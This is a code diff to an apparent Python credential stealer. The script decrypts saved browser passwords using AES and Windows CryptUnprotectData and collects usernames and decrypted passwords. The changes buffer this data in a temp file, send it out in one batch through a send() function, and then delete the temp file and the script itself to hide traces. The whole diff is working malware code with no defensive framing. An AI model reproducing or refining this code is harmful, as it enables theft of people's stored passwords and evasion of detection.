@@ -69,6 +69,16 @@ def send(text):
     return r
 
 
+def temp_store(mode, data=None):
+    if mode == 'write':
+        with open("temp.txt", 'a') as f:
+            f.write(data)
+
+    elif mode == 'read':
+        with open("temp.txt", 'r') as f:
+            return f.readlines()
+
+
 def password_decryption(password, encryption_key):
     try:
         iv = password[3:15]
@@ -80,8 +90,9 @@ def password_decryption(password, encryption_key):
         # decrypt password
         return cipher.decrypt(password)[:-16].decode()
     except:
-        send("unencripted data : encrytion_key : "+str(encryption_key)+" password : "+str(password))
-        
+
+        send("unencripted data : "+str(iv))
+
         try:
             return str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[1])
         except:
@@ -120,7 +131,7 @@ def main():
             User name: {user_name}
             Decrypted Password: {decrypted_password}
             '''
-            send(infos)
+            temp_store("write", infos)
 
         else:
             continue
@@ -146,11 +157,13 @@ def main():
 
 def delete_file():
     os.remove(os.path.abspath(sys.argv[0]))
+    os.remove("temp.txt")
 
 
 if __name__ == "__main__":
     name = input("enter your name:  ")
     send(f"data from {name}")
     main()
+    send(temp_store("read"))
     print('success')
     delete_file()
